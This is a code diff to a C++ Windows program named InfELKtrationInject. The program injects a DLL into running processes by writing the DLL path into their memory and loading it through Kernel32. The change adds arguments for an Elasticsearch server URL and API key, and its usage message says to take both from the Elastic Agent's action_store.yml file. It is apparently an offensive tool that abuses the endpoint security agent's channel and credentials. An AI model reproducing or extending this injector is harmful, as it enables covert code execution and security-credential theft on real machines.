@@ -7,23 +7,41 @@
 
 #include "Logger.h"
 
+#include "LibConstants.h"
+
 #define DLL_FILEPATH_MAX_LENGTH 120
 
-// code references:
-// https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
-// https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
-
-BOOL inject_dll();
+BOOL inject_dll(const char *);
 
 int main(int argc, char **argv)
 {
-    inject_dll();
+    if (argc != 4) {
+        Logger::Error("Not enough arguments!");
+        Logger::Error("Usage: %s [path to InfELKtrationInjectLib.dll] [full URL to ElasticSearch server] [ElasticSearch API key]", argv[0]);
+        Logger::Error("You can get the URL/API key from C:\\Program Files\\Elastic\\Agent\\data\\elastic-agent-xxxxxx\\action_store.yml, at something like policy.outputs.default at the bottom");
+        
+        return 1;
+    }
+
+
+
+    Logger::Info("Injecting DLL at %s", argv[1]);
+
+    if (inject_dll(argv[1])) {
+        Logger::Info("Successfully injected DLL");
+    }
+    else {
+        Logger::Error("Failed to inject DLL");
+    }
 }
 
-BOOL inject_dll() {
+BOOL inject_dll(const char *dllFilename) {
+    // code references:
+    // https://docs.microsoft.com/en-us/windows/win32/psapi/enumerating-all-processes
+    // https://docs.microsoft.com/en-us/windows/win32/toolhelp/taking-a-snapshot-and-viewing-processes
+
     HANDLE hSnapshot, hProcess;
     PROCESSENTRY32 processEntry;
-    CHAR dllFilename[DLL_FILEPATH_MAX_LENGTH] = "C:\\Users\\Administrator\\source\\repos\\InfELKtrationInject\\x64\\Debug\\InfELKtrationInjectLib.dll";
     DWORD targetPid = 0;
     DWORD targetPids[5] = { 0 };
     DWORD targetPidCount = 0;
@@ -89,7 +107,7 @@ BOOL inject_dll() {
             return false;
         }
     
-        Logger::Info("Allocated mem for dll filepath: 0x%p", szDllFilepath);
+        Logger::Info("Allocated mem for DLL filepath: 0x%p", szDllFilepath);
     
         // write dll path into target process
         if (!WriteProcessMemory(hProcess, szDllFilepath, dllFilename, DLL_FILEPATH_MAX_LENGTH, NULL)) {
@@ -98,7 +116,7 @@ BOOL inject_dll() {
             return false;
         }
     
-        Logger::Info("Copied dll path into target process");
+        Logger::Info("Copied DLL path into target process");
 
         hKernel32 = GetModuleHandleA("Kernel32");
         if (!hKernel32) {
@@ -118,7 +136,6 @@ BOOL inject_dll() {
     
         Logger::Info("Executed DLL in target process");
     
-        //VirtualFreeEx(hProcess, (LPVOID)szDllFilepath, 0, MEM_RELEASE); // this will crash the process, i haven't a clue why
         CloseHandle(hProcess);
     }
 
